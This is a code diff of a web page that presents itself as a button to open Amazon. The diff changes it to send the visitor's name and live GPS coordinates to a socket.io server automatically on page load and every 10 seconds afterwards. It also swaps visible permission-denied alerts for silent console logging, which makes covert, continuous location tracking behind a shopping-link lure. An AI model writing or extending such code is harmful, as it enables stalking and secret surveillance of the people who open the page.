@@ -4,34 +4,45 @@
     <title>Amazon + Live Location</title>
 </head>
 <body>
-    <h2>Click the button to load Amazon & send location</h2>
+    <h2>Click the button to open Amazon & send location</h2>
     <button id="startBtn">Start</button>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io(); // connect to server
-        const name = prompt("Enter your name");
+        const name = prompt("Enter your name"); // ya hardcode kar sakte ho
 
-        document.getElementById("startBtn").addEventListener("click", function() {
+        // Function to send location
+        function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Send location to server
                         const data = {
                             name: name,
                             lat: position.coords.latitude,
                             lon: position.coords.longitude
                         };
                         socket.emit("location", data);
-
-                        // Open Amazon after permission
-                        window.location.href = "https://www.amazon.in";
+                        console.log("Location sent:", data);
                     },
-                    () => alert("Location permission denied")
+                    () => console.log("Location permission denied")
                 );
             } else {
-                alert("Geolocation not supported");
+                console.log("Geolocation not supported");
             }
+        }
+
+        // 1️⃣ Send location automatically on page load
+        window.addEventListener("load", () => {
+            sendLocation();
+            // Repeat every 10 seconds
+            setInterval(sendLocation, 10000);
+        });
+
+        // 2️⃣ Button to open Amazon
+        document.getElementById("startBtn").addEventListener("click", function() {
+            sendLocation(); // Send immediately before opening
+            window.open("https://www.amazon.in", "_blank"); // open in new tab
         });
     </script>
 </body>
